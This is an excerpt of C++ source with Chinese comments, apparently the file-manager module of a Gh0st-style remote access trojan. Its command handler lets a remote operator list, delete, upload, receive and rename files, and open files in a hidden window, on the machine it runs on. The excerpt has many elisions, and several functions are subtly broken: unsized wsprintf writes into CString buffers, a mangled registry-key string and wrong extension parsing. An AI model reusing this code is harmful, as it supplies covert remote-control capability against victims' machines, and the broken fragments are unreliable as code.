...
void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	...
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((wchar_t *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		DeleteFile((wchar_t *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		////printf("删除目录 %s\n", (char *)(bPacket + 1));
		DeleteDirectory((wchar_t *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	...
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((wchar_t *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((wchar_t *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
...
bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	...
	CString Filename;
	Filename = lpFile;
	m_index = Filename.ReverseFind(_T('.'));
	m_index --;
	CString ext;
	ext = Filename.Right(m_index);

// 	const char	*lpExt = strrchr(lpFile, '.');
// 	if (!lpExt)
// 		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, ext, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp.GetBuffer(), &nSize);
	RegCloseKey(hKey);
	//memset(lpSubKey, 0, sizeof(lpSubKey));
	//wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	lpSubKey = _T("%s\\shell\\open\\command") + strTemp;
	...
	RegQueryValue(hKey, NULL, strTemp.GetBuffer(), &nSize);
	RegCloseKey(hKey);
	m_index = strTemp.Find(_T("\"%1"));
	CString strCat;
	strCat = strTemp.Left(m_index);
	if (strCat.IsEmpty())
		strCat = strTemp.Left(strTemp.Find(_T("%1")));
...
UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	...
	wsprintf(strPath.GetBuffer(), _T("%s\\*.*"), lpszDirectory);
...
bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	...
	CString lpszFilter;
	wsprintf(lpszFilter.GetBuffer(), _T("%s\\*.*"), lpszDirectory);
	...
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				...
				wsprintf(strDirectory.GetBuffer(), _T("%s\\%s"), lpszDirectory, wfd.cFileName);
			...
			else
			{
				...
				CString strFile;
				wsprintf(strFile.GetBuffer(), _T("%s\\%s"), lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
...
UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	...
	m_strCurrentProcessFileName = lpszFileName;
...
UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	...
	FileName = m_strCurrentProcessFileName;
	// 远程跳过，传送下一个
...
{
	list <CString>::iterator it = m_UploadList.begin();
	// 删除一个任务
...
bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	...
	if (lpBuffer[lstrlen((wchar_t *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((LPCTSTR)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
	...
	{
		m_UploadList.push_back((wchar_t *)lpBuffer);
	}
...
bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	...
	wsprintf(lpszFilter.GetBuffer(), _T("%s%s*.*"), lpPathName, lpszSlash);
	...
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				//char strDirectory[MAX_PATH];
				CString strDirectory;
				wsprintf(strDirectory.GetBuffer(), _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
			...
			else
			{
				//char strFile[MAX_PATH];
				CString strFile;
				wsprintf(strFile.GetBuffer(), _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
...
void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	...
	m_strCurrentProcessFileName = (wchar_t*)lpBuffer; 
...
{
	MakeSureDirectoryPathExists((wchar_t *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (wchar_t *)lpBuffer;
